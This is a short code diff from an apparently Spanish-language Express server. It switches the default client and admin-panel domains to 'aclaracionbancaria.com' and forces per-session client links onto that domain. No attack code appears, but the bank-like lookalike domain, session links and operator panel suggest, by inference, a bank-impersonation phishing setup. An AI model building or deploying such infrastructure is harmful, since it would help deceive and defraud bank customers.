@@ -1013,8 +1013,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       }
 
       // Configuración de dominios
-      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaracion.info';
-      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaracion.info';
+      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaracionbancaria.com';
+      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaracionbancaria.com';
 
       // Detectamos si estamos en Replit para generar enlaces locales para pruebas
       const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
@@ -1024,8 +1024,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
       const protocol = req.headers['x-forwarded-proto'] || 'https';
       
-      // FORZAMOS el uso de aclaracion.info independientemente del entorno
-      const clientLink = `https://aclaracion.info/${sessionId}`;
+      // FORZAMOS el uso de aclaracionbancaria.com independientemente del entorno
+      const clientLink = `https://aclaracionbancaria.com/${sessionId}`;
       
       // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
       const adminLink = isReplit 
